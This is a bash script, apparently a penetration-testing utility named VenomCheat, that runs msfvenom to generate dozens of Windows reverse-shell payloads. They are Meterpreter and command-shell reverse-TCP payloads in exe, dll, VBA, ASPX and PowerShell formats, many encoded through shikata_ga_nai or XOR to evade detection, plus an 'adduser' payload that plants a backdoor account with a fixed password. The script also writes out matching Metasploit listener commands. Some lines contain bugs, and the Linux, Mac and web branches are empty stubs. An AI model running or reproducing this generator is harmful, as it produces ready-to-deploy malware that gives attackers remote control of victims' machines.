#!/bin/bash
#V1 is first release and Doesn't include sequential port numbering yet

#Vars
IP="" #-i
Port_Method="static" #-n
Port="" #-p
OS="all" #-o
VERS="1.0.0"
Arch="all"


#border function
border()
{
    title="| $1 |"
    edge=$(echo "$title" | sed 's/./-/g')
    echo "$edge"
    echo "$title"
    echo "$edge"
}

#Help and Welcome
usage() {
  echo "██    ██ ███████ ███    ██  ██████  ███    ███      ██████ ██   ██ ███████  █████  ████████  "
  echo "██    ██ ██      ████   ██ ██    ██ ████  ████     ██      ██   ██ ██      ██   ██    ██    "
  echo "██    ██ █████   ██ ██  ██ ██    ██ ██ ████ ██     ██      ███████ █████   ███████    ██    "
  echo " ██  ██  ██      ██  ██ ██ ██    ██ ██  ██  ██     ██      ██   ██ ██      ██   ██    ██     "
  echo "  ████   ███████ ██   ████  ██████  ██      ██      ██████ ██   ██ ███████ ██   ██    ██      "
  echo ""
  border "About"
  echo "Version:        $VERS"
  echo "Created By:     marc@theirsecurity.com"
  echo "Github Release: http://github.com/theirsecurity/venomcheat"
  border "Usage"
  echo "VenomCheat uses msfvenom to create a multitude of different Metasploit payloads at once"
  echo "There are a few options you can set when you run this if you just want a specific OS"
  echo "This will place the generated payloads in the current directory, named so you know what they are"
    border "Options"
  echo "-i  This sets the local host of your payloads                       Default:BLANK"
  echo "-p  This will set the local port for your payloads                  Default:BLANK"
  echo "-o  This allows you to specify one target OS                        Default:all"
  echo "-n  This allows you to set if port will be static or sequential     Default:Static"
  echo "-a  This allows you to specify x86,x64 or all                       Default:all"
  border "OS"
  echo "The following options are used with -o, If you want them all omit -o"
  echo "-o win    This will generate only windows payloads"
  echo "-o lin    This will generate only linux payloads"
  echo "-o mac    This will generate only mac payloads"
  echo "-o web    This will generate only web payloads"
  border "Archetecture"
  echo "The following options are used to set the archetecture, if you want them all omit -a"
  echo "-a x86    This will only generate 32bit payloads"
  echo "-a x64    This will only generate 64bit payloads"
  border "Port Numbering"
  echo "The following options are used with -n"
  echo "-n static   All payloads are generated with the same listening port (This is default)"
  echo "-n seq      Payloads will be generated with different listening ports starting at the -p option"
  border "readme.md"
  echo "Once the script has run it will create a readme.md in the Venom Directory"
  echo "This will show the options used, everything it created, each files location and a command to start metasploit"
}
exit_abnormal() {
  usage
  exit 1
}

#Get opts
while getopts "i:o:p:a:n:h" options; do
  case "${options}" in
    i)
     IP=${OPTARG}
     ;;
    h)
    exit_abnormal
    ;;
    p)
    Port=${OPTARG}
    ;;
    o)
    OS=${OPTARG}
    ;;
    n)
    Port_Method=${OPTARG}
    ;;
    a)
    Arch=${OPTARG}
    ;;
  esac
done

#Error checking

if [[ $IP = "" ]] || [[ $Port = "" ]] #IP & Port Error check
then
  border "Error"
  echo "Please specify and IP and port"
  echo "To see syntax & Options use ./VenomCheat.sh -h"
  exit 1
else
  echo "" > /dev/null
fi

if [[ $OS = "all" ]] || [[ $OS = "win" ]] || [[ $OS = "lin" ]] || [[ $OS = "mac" ]] || [[ $OS = "web" ]] #OS Error Check
then
  echo "" > /dev/null
else
  border "Error"  echo "Static Selected"
  echo "Invalid OS Selected"
  echo "To see syntax & Options use ./VenomCheat.sh -h"
  exit 1
fi

if [[ $Port_Method = "seq" ]] || [[ $Port_Method = "static" ]] #Port Method Error Check
then
  echo "" > /dev/null
else
  border "Error"
  echo "Invalid Port Numbering Option Selected"
  echo "To see syntax & Options use ./VenomCheat.sh -h"
  exit 1
fi

if [[ $Arch = "all" ]] || [[ $Arch = "x64" ]] || [[ $Arch = "x86" ]] #Arch Error Check
then
  echo "" > /dev/null
else
  border "Error"
  echo "Invalid Archetecture Selected"
  echo "To see syntax & Options use ./VenomCheat.sh -h"
  exit 1
fi

#Directory
mkdir ./Venom && cd ./Venom


#Readme Initialisation
border "Settings Used" > readme.md
echo "Local IP:     $IP" >> readme.md
if [[ $Port_Method = "static" ]]
then
  echo "Local Port:   $Port" >> readme.md
else
  echo "Ports will be numbered incrementaly" >> readme.md
fi
echo "OS:             $OS" >> readme.md
echo "" >> readme.md
border "Output and Commands" >> readme.md
echo "This file contains a list of all generated payloads and Metasploit commands" >> readme.md
echo "The first line Shows the payload and its ouput directory" >> readme.md
echo "The second line can be copied and pasted into a terminal which will start metasploit and set payload and options" >> readme.md
echo "" >> readme.md




if [[ $Port_Method = "seq" ]]
then
  echo "Sequential Selected"
else
  if [[ $OS = "all" ]] || [[ $OS = "win" ]]
  then
    mkdir ./Windows
    if [[ $Arch = "all" ]] || [[ $Arch = "x86" ]]
    then
      border "Windows x86" >> readme.md
      echo "Encoded Payloads are with Shikata ga nai to 8 iterations" >> readme.md
      mkdir ./Windows/x86
      msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$Port -f exe > ./Windows/x86/Meterpreter_Reverse_TCP_$Port.exe && echo "Meterpreter_Reverse_TCP (exe)   /Windows/x86/Meterpreter_Reverse_TCP_$Port.exe" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set lhost $IP;set lport $Port'" >> readme.md && echo "" >> readme.md
      msfvenom -a x86 --platform windows -p windows/adduser USER=adm1n PASS=Password123! -f exe > ./Windows/x86/adduser.exe && echo "Add_User (exe)     /Windows/x86/adduser.exe" >> readme.md && echo "Creates  User:adm1n Pass:Password123!" >> readme.md && echo "" >> readme.md
      msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=$IP LPORT=$Port -f exe > ./Windows/x86/Shell_reverse_tcp_$Port.exe && echo "CMDShell_Reverse_TCP (exe)    /Windows/x86/Shell_reverse_tcp_$Port.exe" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/shell/reverse_tcp;set lhost $IP;set lport $Port'" >> readme.md && echo "" >> readme.md
      msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$Port -e x86/shikata_ga_nai -b "\x00" -i 8 -f exe > ./Windows/x86/ENCMeterpreter_Reverse_TCP_$Port.exe && echo "Encoded_Meterpreter_Reverse_TCP (exe)   /Windows/X86/ENCMeterpreter_Reverse_TCP_$Port.exe" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set lhost $IP;set lport $Port'" >> readme.md && echo "" >> readme.md
      msfvenom -a x86 --platform windows -p windows/adduser USER=adm1n PASS=Password123! -e x86/shikata_ga_nai -b "\x00" -i 8 -f exe > ./Windows/x86/ENCadduser.exe && echo "Encoded Add_User (exe)     /Windows/X86/ENCadduser.exe" >> readme.md && echo "Creates  User:adm1n Pass:Password123!" >> readme.md && echo "" >> readme.md
      msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=$IP LPORT=$Port -e x86/shikata_ga_nai -b "\x00" -i 8 -f exe > ./Windows/x86/ENCShell_reverse_tcp_$Port.exe && echo "Encoded CMDShell_Reverse_TCP (exe)    /Windows/X86/ENCShell_reverse_tcp_$Port.exe" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/shell/reverse_tcp;set lhost $IP;set lport $Port'" >> readme.md && echo "" >> readme.md
      msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=$IP LPORT=$Port -f dll > ./Windows/x86/shell_reverse_tcp_$Port.dll && echo "shell_Reverse_TCP (dll)   /Windows/x86/shell_reverse_tcp_$Port.dll" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/shell/reverse_tcp;set lhost $IP;set lport $Port'" >> readme.md && echo "" >> readme.md
      msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$Port -f dll > ./Windows/x86/meterpreter_reverse_tcp_$Port.dll && echo "meterpreter_Reverse_TCP (dll)   /Windows/x86/meterpreter_reverse_tcp_$Port.dll" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set lhost $IP;set lport $Port'" >> readme.md && echo "" >> readme.md
      msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=$IP LPORT=$Port -e x86/shikata_ga_nai -b "\x00" -i 8 -f dll > ./Windows/x86/ENCShell_reverse_tcp_$Port.dll && echo "Encoded CMDShell_Reverse_TCP (dll)    /Windows/X86/ENCShell_reverse_tcp_$Port.dll" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/shell/reverse_tcp;set lhost $IP;set lport $Port'" >> readme.md && echo "" >> readme.md
      msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$Port -e x86/shikata_ga_nai -b "\x00" -i 8 -f dll > ./Windows/x86/ENCMeterpreter_Reverse_TCP_$Port.dll && echo "Encoded_Meterpreter_Reverse_TCP (dll)   /Windows/x86/ENCMeterpreter_Reverse_TCP_$Port.dll" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set lhost $IP;set lport $Port'" >> readme.md && echo "" >> readme.md
      msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=$IP LPORT=$Port -f vba > ./Windows/x86/shell_reverse_tcp_$Port.txt && echo "shell_Reverse_TCP (vba)   /Windows/x86/shell_reverse_tcp_$Port.vba" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/shell/reverse_tcp;set lhost $IP;set lport $Port'" >> readme.md && echo "" >> readme.md
      msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$Port -f vba > ./Windows/x86/meterpreter_reverse_tcp_$Port.txt && echo "meterpreter_Reverse_TCP (vba)   /Windows/x86/meterpreter_reverse_tcp_$Port.txt" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set lhost $IP;set lport $Port'" >> readme.md && echo "" >> readme.md
      msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=$IP LPORT=$Port -e x86/shikata_ga_nai -b "\x00" -i 8 -f vba > ./Windows/x86/ENCShell_reverse_tcp_$Port.txt && echo "Encoded CMDShell_Reverse_TCP (vba)    /Windows/x86/ENCShell_reverse_tcp_$Port.txt" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/shell/reverse_tcp;set lhost $IP;set lport $Port'" >> readme.md && echo "" >> readme.md
      msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$Port -e x86/shikata_ga_nai -b "\x00" -i 8 -f vba > ./Windows/x86/ENCMeterpreter_Reverse_TCP_$Port.txt && echo "Encoded_Meterpreter_Reverse_TCP (vba)   /Windows/x86/ENCMeterpreter_Reverse_TCP_$Port.txt" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set lhost $IP;set lport $Port'" >> readme.md && echo "" >> readme.md
      msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=$IP LPORT=$Port -f aspx > ./Windows/x86/shell_reverse_tcp_$Port.aspx && echo "shell_Reverse_TCP (aspx)   /Windows/x86/shell_reverse_tcp_$Port.aspx" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/shell/reverse_tcp;set lhost $IP;set lport $Port'" >> readme.md && echo "" >> readme.md
      msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$Port -f aspx > ./Windows/x86/meterpreter_reverse_tcp_$Port.aspx && echo "meterpreter_Reverse_TCP (aspx)   /Windows/x86/meterpreter_reverse_tcp_$Port.aspx" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set lhost $IP;set lport $Port'" >> readme.md && echo "" >> readme.md
      msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=$IP LPORT=$Port -e x86/shikata_ga_nai -b "\x00" -i 8 -f aspx > ./Windows/x86/ENCShell_reverse_tcp_$Port.aspx && echo "Encoded CMDShell_Reverse_TCP (aspx)    /Windows/x86/ENCShell_reverse_tcp_$Port.aspx" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/shell/reverse_tcp;set lhost $IP;set lport $Port'" >> readme.md && echo "" >> readme.md
      msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$Port -e x86/shikata_ga_nai -b "\x00" -i 8 -f aspx > ./Windows/x86/ENCMeterpreter_Reverse_TCP_$Port.aspx && echo "Encoded_Meterpreter_Reverse_TCP (aspx)   /Windows/x86/ENCMeterpreter_Reverse_TCP_$Port.aspx" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set lhost $IP;set lport $Port'" >> readme.md && echo "" >> readme.md
      msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=$IP LPORT=$Port -f psh > ./Windows/x86/shell_reverse_tcp_$Port.ps1 && echo "shell_Reverse_TCP (Powershell)   /Windows/x86/shell_reverse_tcp_$Port.ps1" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/shell/reverse_tcp;set lhost $IP;set lport $Port'" >> readme.md && echo "" >> readme.md
      msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$Port -f psh > ./Windows/x86/meterpreter_reverse_tcp_$Port.ps1 && echo "meterpreter_Reverse_TCP (Powershell)   /Windows/x86/meterpreter_reverse_tcp_$Port.ps1" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set lhost $IP;set lport $Port'" >> readme.md && echo "" >> readme.md
      msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=$IP LPORT=$Port -e x86/shikata_ga_nai -b "\x00" -i 8 -f psh > ./Windows/x86/ENCShell_reverse_tcp_$Port.ps1 && echo "Encoded CMDShell_Reverse_TCP (Powershell)    /Windows/x86/ENCShell_reverse_tcp_$Port.ps1" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/shell/reverse_tcp;set lhost $IP;set lport $Port'" >> readme.md && echo "" >> readme.md
      msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$Port -e x86/shikata_ga_nai -b "\x00" -i 8 -f psh > ./Windows/x86/ENCMeterpreter_Reverse_TCP_$Port.ps1 && echo "Encoded_Meterpreter_Reverse_TCP (Powershell)   /Windows/x86/ENCMeterpreter_Reverse_TCP_$Port.ps1" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set lhost $IP;set lport $Port'" >> readme.md && echo "" >> readme.md
    else
      echo "" > /dev/null
    fi

    if [[ $Arch = "all" ]] || [[ $Arch = "x64" ]]
    then
      mkdir ./Windows/x64
      border "Windows x64" >> readme.md
      echo "Encoded payloads are with XOR to 8 iterations" >> readme.md
      msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=$Port -f exe > ./Windows/x64/Meterpreter_Reverse_TCP_$Port.exe && echo "Meterpreter_Reverse_TCP (exe)   /Windows/x64/Meterpreter_Reverse_TCP_$Port.exe" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set lhost $IP;set lport $Port'" >> readme.md && echo "" >> readme.md
      msfvenom -a x64 --platform windows -p windows/x64/shell/reverse_tcp LHOST=$IP LPORT=$Port -f exe > ./Windows/x64/Shell_reverse_tcp_$Port.exe && echo "CMDShell_Reverse_TCP (exe)    /Windows/x64/Shell_reverse_tcp_$Port.exe" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/shell/reverse_tcp;set lhost $IP;set lport $Port'" >> readme.md && echo "" >> readme.md
      msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=$Port -e x64/xor_dynamic -b "\x00" -i 8 -f exe > ./Windows/x64/ENCMeterpreter_Reverse_TCP_$Port.exe && echo "Encoded_Meterpreter_Reverse_TCP (exe)   /Windows/x64/ENCMeterpreter_Reverse_TCP_$Port.exe" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set lhost $IP;set lport $Port'" >> readme.md && echo "" >> readme.md
      msfvenom -a x64 --platform windows -p windows/x64/shell/reverse_tcp LHOST=$IP LPORT=$Port -e x64/xor_dynamic -b "\x00" -i 8 -f exe > ./Windows/x64/ENCShell_reverse_tcp_$Port.exe && echo "Encoded CMDShell_Reverse_TCP (exe)    /Windows/x64/ENCShell_reverse_tcp_$Port.exe" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/shell/reverse_tcp;set lhost $IP;set lport $Port'" >> readme.md && echo "" >> readme.md
      msfvenom -a x64 --platform windows -p windows/x64/shell/reverse_tcp LHOST=$IP LPORT=$Port -f dll > ./Windows/x64/shell_reverse_tcp_$Port.dll && echo "shell_Reverse_TCP (dll)   /Windows/x64/shell_reverse_tcp_$Port.dll" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/shell/reverse_tcp;set lhost $IP;set lport $Port'" >> readme.md && echo "" >> readme.md
      msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=$Port -f dll > ./Windows/x64/meterpreter_reverse_tcp_$Port.dll && echo "meterpreter_Reverse_TCP (dll)   /Windows/x64/meterpreter_reverse_tcp_$Port.dll" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set lhost $IP;set lport $Port'" >> readme.md && echo "" >> readme.md
      msfvenom -a x64 --platform windows -p windows/x64/shell/reverse_tcp LHOST=$IP LPORT=$Port -e x64/xor_dynamic  -b "\x00" -i 8 -f dll > ./Windows/x64/ENCShell_reverse_tcp_$Port.dll && echo "Encoded CMDShell_Reverse_TCP (dll)    /Windows/x64/ENCShell_reverse_tcp_$Port.dll" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/shell/reverse_tcp;set lhost $IP;set lport $Port'" >> readme.md && echo "" >> readme.md
      msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=$Port -e x64/xor_dynamic  -b "\x00" -i 8 -f dll > ./Windows/x64/ENCMeterpreter_Reverse_TCP_$Port.dll && echo "Encoded_Meterpreter_Reverse_TCP (dll)   /Windows/x64/ENCMeterpreter_Reverse_TCP_$Port.dll" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set lhost $IP;set lport $Port'" >> readme.md && echo "" >> readme.md
      msfvenom -a x64 --platform windows -p windows/x64/shell/reverse_tcp LHOST=$IP LPORT=$Port -f vba > ./Windows/x64/shell_reverse_tcp_$Port.txt && echo "shell_Reverse_TCP (vba)   /Windows/x64/shell_reverse_tcp_$Port.vba" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/shell/reverse_tcp;set lhost $IP;set lport $Port'" >> readme.md && echo "" >> readme.md
      msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=$Port -f vba > ./Windows/x64/meterpreter_reverse_tcp_$Port.txt && echo "meterpreter_Reverse_TCP (vba)   /Windows/x64/meterpreter_reverse_tcp_$Port.txt" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/meterpreter/x64/reverse_tcp;set lhost $IP;set lport $Port'" >> readme.md && echo "" >> readme.md
      msfvenom -a x64 --platform windows -p windows/x64/shell/reverse_tcp LHOST=$IP LPORT=$Port -e x64/xor_dynamic  -b "\x00" -i 8 -f vba > ./Windows/x64/ENCShell_reverse_tcp_$Port.txt && echo "Encoded CMDShell_Reverse_TCP (vba)    /Windows/x64/ENCShell_reverse_tcp_$Port.txt" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/shell/reverse_tcp;set lhost $IP;set lport $Port'" >> readme.md && echo "" >> readme.md
      msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=$Port -e x64/xor_dynamic -b "\x00" -i 8 -f vba > ./Windows/x64/ENCMeterpreter_Reverse_TCP_$Port.txt && echo "Encoded_Meterpreter_Reverse_TCP (vba)   /Windows/x64/ENCMeterpreter_Reverse_TCP_$Port.txt" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set lhost $IP;set lport $Port'" >> readme.md && echo "" >> readme.md
      msfvenom -a x64 --platform windows -p windows/x64/shell/reverse_tcp LHOST=$IP LPORT=$Port -f aspx > ./Windows/x64/shell_reverse_tcp_$Port.aspx && echo "shell_Reverse_TCP (aspx)   /Windows/x64/shell_reverse_tcp_$Port.aspx" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/shell/reverse_tcp;set lhost $IP;set lport $Port'" >> readme.md && echo "" >> readme.md
      msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=$Port -f aspx > ./Windows/x64/meterpreter_reverse_tcp_$Port.aspx && echo "meterpreter_Reverse_TCP (aspx)   /Windows/x64/meterpreter_reverse_tcp_$Port.aspx" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set lhost $IP;set lport $Port'" >> readme.md && echo "" >> readme.md
      msfvenom -a x64 --platform windows -p windows/x64/shell/reverse_tcp LHOST=$IP LPORT=$Port -e -e x64/xor_dynamic -b "\x00" -i 8 -f aspx > ./Windows/x64/ENCShell_reverse_tcp_$Port.aspx && echo "Encoded CMDShell_Reverse_TCP (aspx)    /Windows/x64/ENCShell_reverse_tcp_$Port.aspx" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/shell/reverse_tcp;set lhost $IP;set lport $Port'" >> readme.md && echo "" >> readme.md
      msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=$Port -e x64/xor_dynamic -b "\x00" -i 8 -f aspx > ./Windows/x64/ENCMeterpreter_Reverse_TCP_$Port.aspx && echo "Encoded_Meterpreter_Reverse_TCP (aspx)   /Windows/x64/ENCMeterpreter_Reverse_TCP_$Port.aspx" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set lhost $IP;set lport $Port'" >> readme.md && echo "" >> readme.md
      msfvenom -a x64 --platform windows -p windows/x64/shell/reverse_tcp LHOST=$IP LPORT=$Port -f psh > ./Windows/x64/shell_reverse_tcp_$Port.ps1 && echo "shell_Reverse_TCP (Powershell)   /Windows/x64/shell_reverse_tcp_$Port.ps1" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/shell/reverse_tcp;set lhost $IP;set lport $Port'" >> readme.md && echo "" >> readme.md
      msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=$Port -f psh > ./Windows/x64/meterpreter_reverse_tcp_$Port.ps1 && echo "meterpreter_Reverse_TCP (Powershell)   /Windows/x64/meterpreter_reverse_tcp_$Port.ps1" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set lhost $IP;set lport $Port'" >> readme.md && echo "" >> readme.md
      msfvenom -a x64 --platform windows -p windows/x64/shell/reverse_tcp LHOST=$IP LPORT=$Port -e x64/xor_dynamic -b "\x00" -i 8 -f psh > ./Windows/x64/ENCShell_reverse_tcp_$Port.ps1 && echo "Encoded CMDShell_Reverse_TCP (Powershell)    /Windows/x64/ENCShell_reverse_tcp_$Port.ps1" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/shell/reverse_tcp;set lhost $IP;set lport $Port'" >> readme.md && echo "" >> readme.md
      msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=$Port -e x64/xor_dynamic -b "\x00" -i 8 -f psh > ./Windows/x64/ENCMeterpreter_Reverse_TCP_$Port.ps1 && echo "Encoded_Meterpreter_Reverse_TCP (Powershell)   /Windows/x64/ENCMeterpreter_Reverse_TCP_$Port.ps1" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set lhost $IP;set lport $Port'" >> readme.md && echo "" >> readme.md
    else
      echo "" > /dev/null
    fi

  else
    echo ""
  fi
  if [[ $OS = "all" ]] || [[ $OS = "lin" ]]
  then
    echo "Linux Install"
  else
    echo ""
  fi
  if [[ $OS = "all" ]] || [[ $OS = "mac" ]]
  then
    echo "MAC Install"
  else
    echo ""
  fi
  if [[ $OS = "all" ]] || [[ $OS = "web" ]]
  then
    echo "Web Install"
  else
    echo ""
  fi
fi



echo "$IP for IP $Port for port $OS for os and $Port_Method for method "
#install commands based on OS

#Confirmation Message
border "Install Complete"


exit 0
